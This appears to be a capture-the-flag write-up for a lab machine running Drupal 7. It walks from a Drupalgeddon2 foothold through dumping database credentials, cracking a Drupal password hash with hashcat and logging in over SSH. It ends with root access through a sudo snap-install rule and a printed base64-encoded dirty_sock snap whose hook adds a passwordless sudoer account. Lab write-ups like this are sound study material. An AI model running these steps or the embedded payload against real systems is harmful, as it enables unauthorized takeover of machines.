# Enum && Foothold
drupal 7 running on apache httpd
known cve
exploit/unix/webapp/drupal_drupalgeddon2

# User Priv Esc
Interesting files revealed in .gitignore
```bash
$ cat /var/www/html/.gitignore
# Ignore configuration files that may contain sensitive information.
sites/*/settings*.php

# Ignore paths that contain user-generated content.
sites/*/files
sites/*/private
```
database creds found in /var/www/html/sites/default/settings.php
```bash
$ cat sites/default/settings.php
...
drupal
drupaluser
CQHEy@9M*m23gBVj
...
```
use mysql client to login to database
```bash
$ mysql -h localhost -u drupaluser -p
use drupal
select * from users;
show;
```
These username and password hash were found
```bash
brucetherealadmin:admin@armageddon.eu
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```
Crack drupal 7 hash with hashcat
```bash
$ hashcat -a 0 -m 7900 hash.txt rockyou.txt
...
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
...
```
ssh into box with these creds
```bash
$ ssh brucetherealadmin@10.10.10.233
```

# Root Priv Esc
```bash
$ sudo -l
(root) NOPASSWD:/usr/bin/snap install *
```
Using a trojan snap package here:
https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
```bash
$ python3 -c "print('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw''' + 'A' 
\* 4256 + '==')" | base64 -d > hack.snap
```
Copy the file onto the box and install it with
```bash
$ sudo snap install --devmode hack.snap
```
Then the user dirty_sock with password dirty_sock will be added with sudoer privilege
```bash
$ su dirty_sock
$ whoami
dirty_sock
$ sudo su
# id
uid=0(root) gid=0(root) groups=0(root)
```
rooted